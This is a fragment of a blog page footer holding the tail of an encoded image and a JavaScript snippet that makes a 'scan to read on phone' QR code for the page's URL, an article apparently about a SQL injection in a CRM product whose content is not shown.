tISFXvf4JXAt5/Q52J/gXAAD//x3w/d8AAAAGSURBVAMARbL4s1J/YJwAAAAASUVORK5CYII=)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/fumacrm-Dingding-Ajax-AjaxMailSetup-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 